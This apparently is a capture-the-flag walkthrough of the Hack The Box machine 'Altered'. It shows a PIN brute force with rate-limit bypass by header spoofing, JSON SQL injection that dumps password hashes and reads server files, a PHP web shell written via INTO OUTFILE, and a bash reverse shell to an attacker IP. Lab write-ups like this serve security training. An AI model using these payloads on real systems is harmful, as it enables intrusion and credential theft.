![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/altered%20logo.png)

# nmap
## nmap all ports
````bash
nmap -p- --min-rate 10000 -T 4 -v -oN nmap-all-ports 10.10.11.159 

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/nmap%20all%20ports.png)

## nmap versions and services
````bash
nmap -sCV -p 22,80 -oN nmap-services-versions -v 10.10.11.159

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/nmap%20versions%20and%20services.png)

# domain
## main domain login
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/main%20domain%20login.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/login%20user%20admin%20exists.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/login%20user%20user%20not%20existence.png)


## forgot password
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/login%20forgot%20password.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/login%20forgot%20password%20pin.png)


# burpsuite
## cookie laravel_session
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/cookie%20laravel%20session.png)


## google laravel session indicates to php framework
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/google%20laravel%20session.png)

## url --> php
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/index.php.png)

# brute force 4 digits pin
## wfuzz
````bash
wfuzz -z range,0000-9999 -u "http://10.10.11.159/api/resettoken" -H "Cookie: XSRF-TOKEN="eyJpdiI6IlNpTXprdWR1WkNNNlhid0hIc1kzd0E9PSIsInZhbHVlIjoieVRwQlhqTUQ3Q3RxWll4TUdsVWo0V0NMclpzNWtVSnJZRzVjME5wamRQeWx2Y3VyQTQwOFRJbjJvNmNCbVdrQ0RIeHd4L3FRL296dk43VTFKaE5yamFsdHJidTZBWVZzZmhpQTQwSEFrSHU0SnJxbHpwZnJPSko3Wk5YVG05QmgiLCJtYWMiOiJhMGExZmQwNjRkZDU0MmRlM2QwY2EzYTNjNzMwMWJhNjRlNmNmNGZiMGI1NTkxMzUxYjBjYjRkYTZkMzE5NTUyIiwidGFnIjoiIn0%3D"" -d "name=admin&pin=FUZZ" 

`````

## response suddenly changes from 200 to 429 --> too many requests
![](Altered/screenshots/wfuzz%20brute%20force%20pin.png)
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/wfuzz%20brute%20force%20pin.png)


![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/headers%20to%20change%20location.png)

# rate-limit bypass

## create ip table for about 10000 requests
````bash
for i in {0..50};do for j in {0..255};do echo "10.10.$i.$j";done;done > iptable

`````

## header: X-Originated-IP doesnt work
````bash
wfuzz -z range,0000-9999 -w iptable -u "http://10.10.11.159/api/resettoken" -H "Cookie: XSRF-TOKEN="eyJpdiI6IlNpTXprdWR1WkNNNlhid0hIc1kzd0E9PSIsInZhbHVlIjoieVRwQlhqTUQ3Q3RxWll4TUdsVWo0V0NMclpzNWtVSnJZRzVjME5wamRQeWx2Y3VyQTQwOFRJbjJvNmNCbVdrQ0RIeHd4L3FRL296dk43VTFKaE5yamFsdHJidTZBWVZzZmhpQTQwSEFrSHU0SnJxbHpwZnJPSko3Wk5YVG05QmgiLCJtYWMiOiJhMGExZmQwNjRkZDU0MmRlM2QwY2EzYTNjNzMwMWJhNjRlNmNmNGZiMGI1NTkxMzUxYjBjYjRkYTZkMzE5NTUyIiwidGFnIjoiIn0%3D"" -d "name=admin&pin=FUZZ" -H "X-Originating-IP: FUZ2Z" -m zip


`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/wfuzz%20brute%20force%20pin%201.png)


````bash

wfuzz -z range,0000-9999 -w iptable -u "http://10.10.11.159/api/resettoken" -H "Cookie: XSRF-TOKEN=eyJpdiI6IkFZNUNORWFwQ21ZWUJYcDhvaEZSYVE9PSIsInZhbHVlIjoidXpMTVcxMk0rTWNDTWFWRWE3YWYwUXVJY0ZWU012NlhzeTJncnVXYUhma0NMekRhSGMwaTVNYzdESWV3NEkwMHVpM2lDaFFpV2VXeGwvbSszeXg3RWo0MzZnVENpZUdKNnZ3RDlPWm9iVnlhZlZVeERrNGZCbzI4TmhOdjJXTVgiLCJtYWMiOiJmYWYzMzY2ZjE0MzRiZmUyMmQ5NGY1ZGMyZWE5MzY5ZDg3MzI0NDY1ZGI4M2E2ZThjOGY5NDA4ZDU4NjRhN2U3IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ik5UemNKL1Iwb2RuSTdSTmpWdExBUkE9PSIsInZhbHVlIjoiSVpDRm10bHdHdFp2TklBY3ludVpqM0tKNTdKcUZhYVM0S2hSVWdwMkd4TnE0RUJRU2RhUXNsR2UzS2dKOVlLV2lxR0VNd0I2dHBIRzBRUGltS2lDYVhqbUlrMnpJKzdxazRnanV6azFJMkFOOXFoV2YzVmk3TVQxbTdvUHhUc1YiLCJtYWMiOiIwMzAxMzFkYTE3ZWVlNWZjYjAzODFhMzgwNzNmMTRhNjQ2OTgyMjdhZDEwY2RhMWU1MjhmOGU0MWY1YTg5OTAwIiwidGFnIjoiIn0%3D" -d "name=admin&pin=FUZZ" -H "X-Forwarded-For: FUZ2Z" -m zip --hh 5644


`````

## wfuzz without filter
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/wfuzz%20unfiltered.png)

## wfuzz: filter amount chars --> valid pin?
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/valid%20pin.png)

## login dashboard
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/login%20dashboard.png)

## burpsuite dashboard
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20login%20dashboard%20secret%20parameter%20initial.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20login%20dashboard%20tampering%20detected.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20convert%20query%20parameter%20to%20json.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20type%20juggling.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20sqli.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20sqli%20union%20with%20existence%20id.png)


![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20sqli%20union%20with%20notexistence%20id.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20sqli%20union%20write%20data.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20sqli%20extract%20data.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20extract%20even%20more%20data.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20extract%20all%20databases%20one%20by%20one.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20extract%20all%20databases%20group_concat.png)

## extract data from uhc database
````mysql

{"id":"1000000000 union select 1,2,group_concat(table_name) from information_schema.columns where table_schema = 'uhc'-- -", "secret":true}



````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20extract%20uhc%20database.png)

````mysql

{"id":"1000000000 union select 1,2,group_concat(concat('\n',table_name,':',column_name)) from information_schema.columns where table_schema = 'uhc'-- -", "secret":true}

`````



![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20extract%20uhc%20database%20and%20prittify.png)


### extract users:name + users:password
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20extratct%20names%20%2B%20passwords.png)

````mysql



{"id":"1000000000 union select 1,2,group_concat(concat('\n',name,':',password)) from uhc.users-- -", "secret":true}

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20sqli%20extract%20users%20and%20passwords.png)

````bash

big0us:$2y$10$L3X8m6P1w.F2aO011ffWr.587vGCYeFXuXwE2vr3DbrYkcuF741N2,
celesian:$2y$10$8ewqN3lE9iazbo8sFiwUleeNIbOpAMRcaMzeiXJ50wlItN2Kd5pI6,
luska:$2y$10$KdZCbzxXRsBOBHI.91XIz.O.lQQ3TqeY8uonzAumoAv6v9JVQv3g.,
tinyb0y:$2y$10$X501zxcWLKXf.OteOaPILuhMBIalFjid5bBjBkrst/cynKL/DLfiS,
o-tafe:$2y$10$XIrsc.ma/p0qhvWm9.sqyOnA5184ICWNverXQVLQJD30nCw7.PyxW,
watchdog:$2y$10$RTbD7i5I53rofpAfr83YcOK2XsTglO01jVHZajEOSH1tGXiU8nzEq,
mydonut:$2y$10$7DFlqs/eXGm0JPVebpPheuEx3gXPhTnRmN1Ia5wutECZg1El7cVJK,
bee:$2y$10$Furn1Q0Oy8IbeCslv7.Oy.psgPoCH2ds3FZfJeQlCdxJ0WVhLKmzm,
admin:$2y$10$wqBKWXLDzqQ3aMmKDumGx.2Sz31z0XE4uPOBmSLOoMY9cqgvHpYgW

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20sqli%20LOAD_FILE().png)

## grasp nginx config file
````
{"id":"1000000000 union select 1,2,LOAD_FILE('/etc/nginx/sites-enabled/default')-- -", "secret":true}

`````

## root is @ /srv/altered/public
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20sqli%20get%20nginx%20config%20file.png)

## sqli write to file
````
{"id":"1000000000 union select 1,2,'xenotim' INTO OUTFILE '/srv/altered/public/omg.html')-- -", "secret":true}

`````

### sqli succesfully written to file
![](sqli%20write%20file%20succesfull.png)

### server error while writing file because sql retrieves no colum back
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/sqli%20write%20file%20succesfull.png)

### php web shell
````mysql
{"id":"1000000000 union select 1,2,'<?php system($_REQUEST[\"cmd\"])?>' INTO OUTFILE '/srv/altered/public/almost.php'-- -", "secret":true}

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/mysql%20to%20php%20web%20shell.png)

### burpsuite get request changed to post request
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20reverse%20shell.png)
````bash
cmd=bash -c 'bash+-i+>%26+/dev/tcp/10.10.14.11/1111+0>%261'

`````
## shell
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/shell%20as%20www-data.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/list%20kernel%20version.png)

### google search for exploit --> dirty pipe
![](Pasted%20image%2020221001004741.png)


XXXXXXXXXXXXXX